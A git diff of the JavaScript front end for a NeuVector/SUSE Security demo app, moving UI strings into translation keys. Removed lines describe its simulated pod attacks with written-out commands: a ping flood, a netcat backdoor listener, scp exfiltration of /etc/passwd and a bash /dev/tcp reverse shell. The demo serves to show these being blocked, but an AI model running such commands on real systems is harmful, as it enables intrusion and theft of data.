+                        <button type="button" class="viz-btn-delete" title="${t('process.delete')}">&times;</button>
                     </div>
                 `).join('');
                 list.className = 'viz-process-items';
@@ -2991,15 +3058,15 @@ class DemoApp {
                     });
                 });
             } else if (result.success) {
-                list.innerHTML = 'No rules';
+                list.innerHTML = t('process.noProcessRules');
                 list.className = 'viz-process-items empty';
             } else {
-                list.innerHTML = 'Error';
+                list.innerHTML = t('process.error');
                 list.className = 'viz-process-items empty';
             }
         } catch (error) {
             console.error('Failed to get process rules:', error);
-            list.innerHTML = 'Error';
+            list.innerHTML = t('process.error');
             list.className = 'viz-process-items empty';
         }
     }
@@ -3092,7 +3159,7 @@ class DemoApp {
         if (profileMode) profileMode.disabled = true;
         if (baseline) baseline.disabled = true;
         if (list) {
-            list.innerHTML = 'Loading...';
+            list.innerHTML = t('events.loading');
             list.className = 'viz-process-items loading';
         }
         if (count) count.textContent = '';
@@ -3140,7 +3207,7 @@ class DemoApp {
                         <div class="viz-process-item" data-name="${this.escapeHtml(p.name)}" data-path="${this.escapeHtml(p.path)}">
                             <span class="viz-process-name">${this.escapeHtml(p.name)}</span>
                             <span class="viz-process-type ${p.cfg_type}">${p.cfg_type}</span>
-                            <button type="button" class="viz-btn-delete" title="Delete">&times;</button>
+                            <button type="button" class="viz-btn-delete" title="${t('process.delete')}">&times;</button>
                         </div>
                     `).join('');
                     list.className = 'viz-process-items';
@@ -3163,14 +3230,14 @@ class DemoApp {
                         });
                     });
                 } else {
-                    list.innerHTML = 'No rules';
+                    list.innerHTML = t('process.noProcessRules');
                     list.className = 'viz-process-items empty';
                 }
             }
         } else {
             // Error or not configured
             if (list) {
-                list.innerHTML = 'Not configured';
+                list.innerHTML = t('process.notConfigured');
                 list.className = 'viz-process-items empty';
             }
         }
@@ -3500,7 +3567,7 @@ class DemoApp {
                         <div class="viz-box viz-source pending" id="viz-source">
                             <div class="viz-box-header">
                                 <div class="viz-icon">🦹</div>
-                                <div class="viz-label">Attacker</div>
+                                <div class="viz-label">${t('viz.attacker')}</div>
                                 <div class="viz-mode-icons" id="viz-src-mode-icons">
                                     <span class="viz-mode-icon network" id="viz-src-icon-network" title="${TOOLTIPS.networkPolicy}">🔍</span>
                                     <span class="viz-mode-icon process" id="viz-src-icon-process" title="${TOOLTIPS.processProfile}">🔍</span>
@@ -3509,24 +3576,24 @@ class DemoApp {
                             <select class="viz-select" id="viz-source-select" name="pod_name">${sourceOptions}</select>
                             <div class="viz-pod-settings" id="viz-source-settings">
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">Network Policy</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">${t('viz.networkPolicy')}</span>
                                     <select class="viz-setting-select" id="viz-src-policy-mode" data-field="policy_mode" data-target="source">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">Process Profile</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">${t('viz.processProfile')}</span>
                                     <select class="viz-setting-select" id="viz-src-profile-mode" data-field="profile_mode" data-target="source">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">Baseline</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">${t('viz.baseline')}</span>
                                     <select class="viz-setting-select" id="viz-src-baseline" data-field="baseline_profile" data-target="source">${baselineOptions}</select>
                                 </div>
                             </div>
                             <div class="viz-process-list" id="viz-source-processes">
                                 <div class="viz-process-header">
-                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">Allowed Processes</span>
+                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">${t('viz.allowedProcesses')}</span>
                                     <span id="viz-src-process-count"></span>
                                 </div>
-                                <div class="viz-process-items loading" id="viz-src-process-items">Loading...</div>
+                                <div class="viz-process-items loading" id="viz-src-process-items">${t('process.loading')}</div>
                             </div>
                         </div>
                         <div class="viz-arrow attack-arrow pending" id="viz-arrow">
@@ -3536,7 +3603,7 @@ class DemoApp {
                         <div class="viz-box viz-target pending" id="viz-target">
                             <div class="viz-box-header">
                                 <div class="viz-icon" id="viz-target-icon">🎯</div>
-                                <div class="viz-label">Target</div>
+                                <div class="viz-label">${t('viz.target')}</div>
                                 <div class="viz-mode-icons" id="viz-tgt-mode-icons" style="display: none;">
                                     <span class="viz-mode-icon network" id="viz-tgt-icon-network" title="${TOOLTIPS.networkPolicy}">🔍</span>
                                     <span class="viz-mode-icon process" id="viz-tgt-icon-process" title="${TOOLTIPS.processProfile}">🔍</span>
@@ -3545,50 +3612,50 @@ class DemoApp {
                             <select class="viz-select" id="viz-attack-target" name="target">${targetOptions}</select>
                             <div class="viz-pod-settings" id="viz-target-settings" style="display: none;">
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">Network Policy</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.networkPolicy}">${t('viz.networkPolicy')}</span>
                                     <select class="viz-setting-select" id="viz-tgt-policy-mode" data-field="policy_mode" data-target="target">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">Process Profile</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.processProfile}">${t('viz.processProfile')}</span>
                                     <select class="viz-setting-select" id="viz-tgt-profile-mode" data-field="profile_mode" data-target="target">${modeOptions}</select>
                                 </div>
                                 <div class="viz-setting-row">
-                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">Baseline</span>
+                                    <span class="viz-setting-label has-tooltip" title="${TOOLTIPS.baseline}">${t('viz.baseline')}</span>
                                     <select class="viz-setting-select" id="viz-tgt-baseline" data-field="baseline_profile" data-target="target">${baselineOptions}</select>
                                 </div>
                             </div>
                             <div class="viz-process-list" id="viz-target-processes" style="display: none;">
                                 <div class="viz-process-header">
-                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">Allowed Processes</span>
+                                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">${t('viz.allowedProcesses')}</span>
                                     <span id="viz-tgt-process-count"></span>
                                 </div>
-                                <div class="viz-process-items loading" id="viz-tgt-process-items">Loading...</div>
+                                <div class="viz-process-items loading" id="viz-tgt-process-items">${t('process.loading')}</div>
                             </div>
                         </div>
                     </div>
                     <div class="viz-status pending" id="viz-status">
                         <span class="viz-status-dot"></span>
-                        <span class="viz-status-text">Ready - Select an attack type</span>
+                        <span class="viz-status-text">${t('viz.readySelectAttack')}</span>
                     </div>
                     <div class="viz-commands attack-commands" id="viz-commands">
-                        <button type="button" class="btn btn-danger btn-cmd attack-btn active" data-attack="dos_ping" title="DoS Ping Flood (40KB payload)">🔥 FLOOD</button>
-                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="nc_backdoor" title="NC Backdoor (netcat listener)">🚪 BACKDOOR</button>
-                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="scp_transfer" title="File Transfer (scp)">📁 SCP</button>
-                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="reverse_shell" title="Reverse Shell">🐚 SHELL</button>
+                        <button type="button" class="btn btn-danger btn-cmd attack-btn active" data-attack="dos_ping" title="${t('attack.dosFlood')}">🔥 FLOOD</button>
+                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="nc_backdoor" title="${t('attack.ncBackdoor')}">🚪 BACKDOOR</button>
+                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="scp_transfer" title="${t('attack.fileTransfer')}">📁 SCP</button>
+                        <button type="button" class="btn btn-outline btn-cmd attack-btn" data-attack="reverse_shell" title="${t('attack.reverseShell')}">🐚 SHELL</button>
                     </div>
                     <div class="attack-description" id="attack-description">
-                        <strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si l'attaque réussit:</em> La cible est saturée, les services deviennent indisponibles (déni de service).<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n'est pas autorisé.
+                        ${t('attack.dosDesc')}
                     </div>
                 </div>
                 <div class="nv-logs-container" id="nv-logs-container">
                     <div class="nv-logs-header">
-                        <span>SUSE Security Events</span>
+                        <span>${t('events.suseSecurityEvents')}</span>
                         <span class="nv-logs-time" id="nv-logs-time"></span>
-                        <button type="button" class="btn-clear-logs" id="btn-clear-logs" title="Clear events">🗑</button>
-                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="Refresh events">↻</button>
+                        <button type="button" class="btn-clear-logs" id="btn-clear-logs" title="${t('events.clearEvents')}">🗑</button>
+                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="${t('events.refreshEvents')}">↻</button>
                     </div>
                     <div class="nv-logs-list empty" id="nv-logs-list">
-                        Click refresh to load events
+                        ${t('events.clickRefresh')}
                     </div>
                 </div>
                 <input type="hidden" id="param-attack_type" name="attack_type" value="dos_ping">
@@ -3680,10 +3747,10 @@ class DemoApp {
             'reverse_shell': '🐚 SHELL'
         };
         const attackDescriptions = {
-            'dos_ping': '<strong>DoS Ping Flood</strong> - Envoie des paquets ICMP surdimensionnés (40KB) pour saturer la cible. Commande: <code>ping -s 40000 -c 5 &lt;target&gt;</code>.<br><em>Si l\'attaque réussit:</em> La cible est saturée, les services deviennent indisponibles (déni de service).<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau (Network Rules) si le trafic ICMP n\'est pas autorisé.',
-            'nc_backdoor': '<strong>NC Backdoor</strong> - Ouvre un port d\'écoute avec netcat pour créer une backdoor. Commande: <code>nc -l 4444</code>.<br><em>Si l\'attaque réussit:</em> Un attaquant peut se connecter au port 4444 et obtenir un accès shell au conteneur compromis.<br><em>Protection:</em> Bloqué par NeuVector en mode Protect car le processus <code>nc</code> n\'est pas dans le profil autorisé (Process Profile Rules).',
-            'scp_transfer': '<strong>SCP Transfer</strong> - Tente de transférer un fichier sensible (/etc/passwd) vers une cible distante. Commande: <code>scp /etc/passwd root@&lt;target&gt;:/tmp/</code>.<br><em>Si l\'attaque réussit:</em> Exfiltration de données sensibles (identifiants, configurations) vers un serveur contrôlé par l\'attaquant.<br><em>Protection:</em> Bloqué par NeuVector via les règles réseau ou le profil de processus.',
-            'reverse_shell': '<strong>Reverse Shell</strong> - Tente d\'établir une connexion shell inverse vers un attaquant. Commande: <code>bash -i &gt;&amp; /dev/tcp/&lt;target&gt;/4444 0&gt;&amp;1</code>.<br><em>Si l\'attaque réussit:</em> L\'attaquant obtient un accès shell interactif complet au conteneur, permettant l\'exécution de commandes arbitraires.<br><em>Protection:</em> Bloqué par NeuVector en mode Protect car c\'est un processus non autorisé.'
+            'dos_ping': () => t('attack.dosDesc'),
+            'nc_backdoor': () => t('attack.backdoorDesc'),
+            'scp_transfer': () => t('attack.scpDesc'),
+            'reverse_shell': () => t('attack.shellDesc')
         };
 
         attackButtons.forEach(btn => {
@@ -3709,7 +3776,8 @@ class DemoApp {
                 }
                 // Update description
                 if (attackDescriptionDiv) {
-                    attackDescriptionDiv.innerHTML = attackDescriptions[attack] || '';
+                    const descFn = attackDescriptions[attack];
+                    attackDescriptionDiv.innerHTML = descFn ? descFn() : '';
                 }
 
                 // Run the attack
@@ -3779,43 +3847,43 @@ class DemoApp {
                             <div class="admission-section">
                                 <div class="admission-header">
                                     <span class="admission-icon">🚫</span>
-                                    <span>Admission Control Test</span>
+                                    <span>${t('admission.controlTest')}</span>
                                 </div>
                                 <div class="admission-controls">
                                     <div class="admission-row">
-                                        <label class="admission-label">Target Namespace</label>
+                                        <label class="admission-label">${t('admission.targetNamespace')}</label>
                                         <select class="viz-select" id="viz-admission-namespace" name="namespace">${namespaceOptions}</select>
                                     </div>
                                     <div class="admission-row">
-                                        <label class="admission-label">Pod Name</label>
+                                        <label class="admission-label">${t('admission.podName')}</label>
                                         <input type="text" class="viz-select" id="viz-admission-pod" name="pod_name" value="${podNameParam?.default || 'test-admission-pod'}">
                                     </div>
                                 </div>
                                 <div class="admission-actions">
-                                    <button type="button" class="btn btn-primary btn-admission" data-action="create" title="Create a test pod in the selected namespace">
-                                        <span class="btn-icon">➕</span> Create Pod
+                                    <button type="button" class="btn btn-primary btn-admission" data-action="create" title="${t('btn.createPod')}">
+                                        <span class="btn-icon">➕</span> ${t('btn.createPod')}
                                     </button>
-                                    <button type="button" class="btn btn-outline btn-admission" data-action="delete" title="Delete the test pod">
-                                        <span class="btn-icon">🗑️</span> Delete Pod
+                                    <button type="button" class="btn btn-outline btn-admission" data-action="delete" title="${t('btn.deletePod')}">
+                                        <span class="btn-icon">🗑️</span> ${t('btn.deletePod')}
                                     </button>
-                                    <button type="button" class="btn btn-outline btn-admission" data-action="status" title="Check pod status">
-                                        <span class="btn-icon">🔍</span> Check Status
+                                    <button type="button" class="btn btn-outline btn-admission" data-action="status" title="${t('btn.checkStatus')}">
+                                        <span class="btn-icon">🔍</span> ${t('btn.checkStatus')}
                                     </button>
                                 </div>
                             </div>
                             <div class="admission-section admission-state">
                                 <div class="admission-header">
                                     <span class="admission-icon">🛡️</span>
-                                    <span>Admission Control State</span>
-                                    <button type="button" class="btn-refresh" id="btn-refresh-admission" title="Refresh state">↻</button>
+                                    <span>${t('admission.controlState')}</span>
+                                    <button type="button" class="btn-refresh" id="btn-refresh-admission" title="${t('admission.refreshState')}">↻</button>
                                 </div>
                                 <div class="admission-state-content" id="admission-state-content">
                                     <div class="admission-state-row">
-                                        <span class="admission-state-label">Status</span>
-                                        <span class="admission-state-value" id="admission-state-enabled">Loading...</span>
+                                        <span class="admission-state-label">${t('admission.status')}</span>
+                                        <span class="admission-state-value" id="admission-state-enabled">${t('settings.loading')}</span>
                                     </div>
                                     <div class="admission-state-row">
-                                        <span class="admission-state-label">Mode</span>
+                                        <span class="admission-state-label">${t('admission.mode')}</span>
                                         <span class="admission-state-value" id="admission-state-mode">-</span>
                                     </div>
                                 </div>
@@ -3823,27 +3891,27 @@ class DemoApp {
                             <div class="admission-section admission-rules">
                                 <div class="admission-header">
                                     <span class="admission-icon">📋</span>
-                                    <span>Admission Rules</span>
+                                    <span>${t('admission.rules')}</span>
                                     <span id="admission-rules-count"></span>
                                 </div>
                                 <div class="admission-rules-list" id="admission-rules-list">
-                                    Loading...
+                                    ${t('events.loading')}
                                 </div>
                             </div>
                         </div>
                     </div>
                     <div class="viz-status pending" id="viz-status">
                         <span class="viz-status-dot"></span>
-                        <span class="viz-status-text">Ready</span>
+                        <span class="viz-status-text">${t('viz.ready')}</span>
                     </div>
                 </div>
                 <div class="nv-logs-container" id="nv-logs-container">
                     <div class="nv-logs-header">
-                        <span>Admission Events</span>
-                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="Refresh events">↻</button>
+                        <span>${t('events.admissionEvents')}</span>
+                        <button type="button" class="btn-refresh" id="btn-refresh-logs" title="${t('events.refreshEvents')}">↻</button>
                     </div>
                     <div class="nv-logs-list empty" id="nv-logs-list">
-                        Click refresh to load events
+                        ${t('events.clickRefresh')}
                     </div>
                 </div>
             </div>
@@ -3946,7 +4014,8 @@ class DemoApp {
         this.syncAdmissionFormFromViz();
 
         // Update visualization to running state
-        this.updateVisualization('running', `${action === 'create' ? 'Creating' : action === 'delete' ? 'Deleting' : 'Checking'} pod...`);
+        const actionMsg = action === 'create' ? t('admission.creatingPod') : action === 'delete' ? t('admission.deletingPod') : t('admission.checkingPod');
+        this.updateVisualization('running', actionMsg);
 
         // Run the demo
         this.runCurrentDemo();
@@ -3961,12 +4030,12 @@ class DemoApp {
 
         if (!enabledEl || !modeEl) return;
 
-        enabledEl.textContent = 'Loading...';
+        enabledEl.textContent = t('settings.loading');
         modeEl.textContent = '-';
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            enabledEl.textContent = 'Not configured';
+            enabledEl.textContent = t('process.notConfigured');
             return;
         }
 
@@ -3985,17 +4054,17 @@ class DemoApp {
             if (result.success) {
                 const enabled = result.enabled;
                 const mode = result.mode || 'monitor';
-                enabledEl.textContent = enabled ? 'Enabled' : 'Disabled';
+                enabledEl.textContent = enabled ? t('admission.enabled') : t('admission.disabled');
                 enabledEl.className = 'admission-state-value ' + (enabled ? 'enabled' : 'disabled');
                 modeEl.textContent = mode.charAt(0).toUpperCase() + mode.slice(1);
                 modeEl.className = 'admission-state-value mode-' + mode;
             } else {
-                enabledEl.textContent = 'Error';
+                enabledEl.textContent = t('settings.error');
                 modeEl.textContent = result.message || 'Failed';
             }
         } catch (error) {
             console.error('Failed to get admission state:', error);
-            enabledEl.textContent = 'Error';
+            enabledEl.textContent = t('settings.error');
         }
     }
 
@@ -4008,13 +4077,13 @@ class DemoApp {
 
         if (!listEl) return;
 
-        listEl.innerHTML = 'Loading...';
+        listEl.innerHTML = t('events.loading');
         listEl.className = 'admission-rules-list loading';
         if (countEl) countEl.textContent = '';
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            listEl.innerHTML = 'Configure SUSE Security credentials first';
+            listEl.innerHTML = t('events.configureCredentials');
             listEl.className = 'admission-rules-list empty';
             return;
         }
@@ -4040,7 +4109,7 @@ class DemoApp {
                         <div class="admission-rule-item ${rule.disable ? 'disabled' : ''} ${rule.rule_type}">
                             <div class="admission-rule-type">${rule.rule_type.toUpperCase()}</div>
                             <div class="admission-rule-info">
-                                <span class="admission-rule-comment">${this.escapeHtml(rule.comment || 'No description')}</span>
+                                <span class="admission-rule-comment">${this.escapeHtml(rule.comment || t('admission.noDescription'))}</span>
                                 <span class="admission-rule-criteria">${this.escapeHtml(criteria)}</span>
                             </div>
                         </div>
@@ -4048,7 +4117,7 @@ class DemoApp {
                 }).join('');
                 listEl.className = 'admission-rules-list';
             } else if (result.success) {
-                listEl.innerHTML = 'No admission rules';
+                listEl.innerHTML = t('admission.noRules');
                 listEl.className = 'admission-rules-list empty';
             } else {
                 listEl.innerHTML = result.message || 'Failed to load';
@@ -4056,7 +4125,7 @@ class DemoApp {
             }
         } catch (error) {
             console.error('Failed to get admission rules:', error);
-            listEl.innerHTML = 'Error loading rules';
+            listEl.innerHTML = t('admission.errorLoadingRules');
             listEl.className = 'admission-rules-list empty';
         }
     }
@@ -4068,12 +4137,12 @@ class DemoApp {
         const logsList = document.getElementById('nv-logs-list');
         if (!logsList) return;
 
-        logsList.innerHTML = 'Loading...';
+        logsList.innerHTML = t('events.loading');
         logsList.className = 'nv-logs-list loading';
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            logsList.innerHTML = 'Configure SUSE Security credentials first';
+            logsList.innerHTML = t('events.configureCredentials');
             logsList.className = 'nv-logs-list empty';
             return;
         }
@@ -4110,7 +4179,7 @@ class DemoApp {
                 }).join('');
                 logsList.className = 'nv-logs-list';
             } else if (result.success) {
-                logsList.innerHTML = 'No admission events';
+                logsList.innerHTML = t('events.noAdmissionEvents');
                 logsList.className = 'nv-logs-list empty';
             } else {
                 logsList.innerHTML = result.message || 'Failed to load events';
@@ -4118,7 +4187,7 @@ class DemoApp {
             }
         } catch (error) {
             console.error('Failed to fetch admission events:', error);
-            logsList.innerHTML = 'Error loading events';
+            logsList.innerHTML = t('events.errorLoading');
             logsList.className = 'nv-logs-list empty';
         }
     }
@@ -4233,11 +4302,11 @@ class DemoApp {
         // Update status text
         if (statusText) {
             const messages = {
-                'pending': 'Ready',
-                'running': 'Connecting...',
-                'success': 'Connection successful',
-                'blocked': 'Network blocked by policy',
-                'intercepted': 'Process blocked by SUSE Security',
+                'pending': t('viz.ready'),
+                'running': t('viz.connecting'),
+                'success': t('viz.connectionSuccessful'),
+                'blocked': t('viz.networkBlocked'),
+                'intercepted': t('viz.processBlocked'),
             };
             statusText.textContent = message || messages[state] || state;
         }
@@ -4273,7 +4342,7 @@ class DemoApp {
         this.eventsFilterTimestamp = new Date().toISOString();
         const logsList = document.getElementById('nv-logs-list');
         if (logsList) {
-            logsList.innerHTML = 'Events cleared - showing new events only';
+            logsList.innerHTML = t('events.eventsCleared');
             logsList.className = 'nv-logs-list empty';
         }
     }
@@ -4295,7 +4364,7 @@ class DemoApp {
 
         const credentials = settingsManager.getCredentials();
         if (!credentials.password) {
-            logsList.innerHTML = 'Configure SUSE Security credentials first';
+            logsList.innerHTML = t('events.configureCredentials');
             logsList.className = 'nv-logs-list empty';
             return;
         }
@@ -4310,7 +4379,7 @@ class DemoApp {
         console.log('[NV Events] Fetching events for group:', groupName || 'all');
 
         // Show loading
-        logsList.innerHTML = 'Loading...';
+        logsList.innerHTML = t('events.loading');
         logsList.className = 'nv-logs-list loading';
         if (refreshBtn) refreshBtn.classList.add('loading');
 
@@ -4355,11 +4424,11 @@ class DemoApp {
                     }).join('');
                     logsList.className = 'nv-logs-list';
                 } else {
-                    logsList.innerHTML = 'No new events since clear';
+                    logsList.innerHTML = t('events.noNewEvents');
                     logsList.className = 'nv-logs-list empty';
                 }
             } else if (result.success) {
-                logsList.innerHTML = this.eventsFilterTimestamp ? 'No new events since clear' : 'No recent events';
+                logsList.innerHTML = this.eventsFilterTimestamp ? t('events.noNewEvents') : t('events.noRecentEvents');
                 logsList.className = 'nv-logs-list empty';
             } else {
                 console.error('[NV Events] API error:', result.message);
@@ -4368,7 +4437,7 @@ class DemoApp {
             }
         } catch (error) {
             console.error('[NV Events] Failed to fetch events:', error);
-            logsList.innerHTML = 'Error loading events';
+            logsList.innerHTML = t('events.errorLoading');
             logsList.className = 'nv-logs-list empty';
         }
 
@@ -4431,24 +4500,24 @@ class DemoApp {
             `;
             statusDisplay = `<div class="pod-status-container" id="pod-status-container">
                 <div class="pod-status-row">
-                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.networkPolicy}">Network Policy:</span>
+                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.networkPolicy}">${t('viz.networkPolicy')}:</span>
                     <select class="pod-status-select" id="pod-policy-mode" data-field="policy_mode">${modeOptions}</select>
                 </div>
                 <div class="pod-status-row">
-                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.processProfile}">Process Profile:</span>
+                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.processProfile}">${t('viz.processProfile')}:</span>
                     <select class="pod-status-select" id="pod-profile-mode" data-field="profile_mode">${modeOptions}</select>
                 </div>
                 <div class="pod-status-row">
-                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.baseline}">Baseline Profile:</span>
+                    <span class="pod-status-label has-tooltip" title="${TOOLTIPS.baseline}">${t('viz.baseline')}:</span>
                     <select class="pod-status-select" id="pod-baseline-profile" data-field="baseline_profile">${baselineOptions}</select>
                 </div>
             </div>
             <div class="process-rules-container" id="process-rules-container">
                 <div class="process-rules-header">
-                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">Allowed Processes</span>
+                    <span class="has-tooltip" title="${TOOLTIPS.allowedProcesses}">${t('viz.allowedProcesses')}</span>
                     <span class="process-rules-count" id="process-rules-count"></span>
                 </div>
-                <div class="process-rules-list loading" id="process-rules-list">Loading...</div>
+                <div class="process-rules-list loading" id="process-rules-list">${t('process.loading')}</div>
             </div>`;
         }
 
@@ -4523,7 +4592,7 @@ class DemoApp {
         // Reset visualization to pending then running
         if (this.vizContainer) {
             this.updateVisualization('pending');
-            setTimeout(() => this.updateVisualization('running', 'Connecting...'), 100);
+            setTimeout(() => this.updateVisualization('running', t('viz.connecting')), 100);
         }
 
         wsManager.executeDemo(this.currentDemo.id, params);
